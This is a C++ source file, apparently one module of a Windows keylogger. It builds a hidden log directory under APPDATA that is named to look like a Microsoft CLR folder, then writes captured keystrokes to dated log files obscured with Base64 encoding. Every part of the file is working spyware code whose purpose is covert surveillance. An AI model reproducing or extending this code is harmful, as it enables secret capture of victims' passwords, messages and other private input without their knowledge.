#include <string>
#include <cstdlib>
#include <Windows.h>
#include "KeyLogger.h"
#include "Base64Encoder.h"

using namespace std;

namespace Input_Output
{
	string GetPath(const bool add_separator = false)
	{
		string appdata_path(getenv("APPDATA"));
		string Full_Path = appdata_path + "\\Microsoft\\CLR";
		return Full_Path + (add_separator ? "\\" : "");
	}

	bool CreateDirNeeded(string path)
	{
		if ((bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
		{
			KeyLogger::InfoLogger("Directory created or already exists");
			KeyLogger::InfoLogger(path);
			return true;
		}
		else
		{
			KeyLogger::ErrorLogger("Unable to create directory");
			KeyLogger::ErrorLogger(path);
			return false;
		}
	}

	bool MakeDirectoryNeeded(string path)
	{
		for (char& c : path)
		{
			if (c == '\\')
			{
				c = '\0';
				if (!CreateDirNeeded(path))
					return false;
				c = '\\';
			}
		}
		return true;
	}

	//Actual Logger function for Logging the keystrokes. Log names will be based on the date of recording
	template <class T>
	string StrokeLogger(const T &strokelog)
	{
		KeyLogger::InfoLogger("Starting Stroke Logger");
		std::string path = GetPath(true);
		KeyLogger::DateTime dt;
		std::string filename = dt.GetDateTimeString("_") + "_strokes.log";

		try
		{
			ofstream file(path + filename);
			if (!file)
			{
				KeyLogger::ErrorLogger("Unable to open stroke logger file");
				return "";
			}
			ostringstream Outstr;
			Outstr << "[" << dt.GetDateTimeString() << "] ["<< KeyLogger::ToString(GetCurrentProcessId()) << "] " << strokelog << endl;
			std::string data = Base64::EncryptMain(Outstr.str()); 
			file << data;
			if (!file)
				return "";
			file.close();
			return filename;
		}
		catch (...)
		{
			return "";
		}
	}
}